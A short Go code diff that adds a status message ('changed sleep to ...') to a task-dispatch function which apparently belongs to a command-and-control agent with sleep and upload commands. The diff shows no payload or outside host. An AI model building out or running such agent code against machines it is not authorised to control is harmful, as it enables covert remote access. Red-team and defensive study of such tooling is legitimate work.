@@ -47,6 +47,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		case "sleep":
 			newSleepTime := taskData
 			*sleep, _ = strconv.Atoi(newSleepTime)
+			data = fmt.Sprintf("changed sleep to %s", newSleepTime)
 		case "upload":
 			taskDataSplit := strings.Split(taskData, " ")
 			uFile := taskDataSplit[0]
